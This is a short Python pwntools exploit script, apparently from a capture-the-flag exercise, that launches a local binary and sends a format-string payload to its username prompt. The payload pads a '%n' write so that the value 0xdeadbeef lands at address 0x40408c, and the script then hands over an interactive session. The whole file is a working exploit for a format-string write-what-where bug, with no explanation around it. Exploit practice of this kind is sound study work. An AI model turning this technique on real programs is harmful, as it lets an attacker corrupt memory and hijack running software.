from pwn import *

r = process("./bin")

address = 0x000000000040408c
value = 0xdeadbeef
log.info(f"Trying to write {hex(value)} to {hex(address)}...")

fmt_offset = 8

payload = f"%{value}c%{fmt_offset + 2}$n".encode()
payload += b" " * (16 - len(payload))
payload += p64(address)

r.sendlineafter(
    b"username: ",
    payload
)

r.interactive()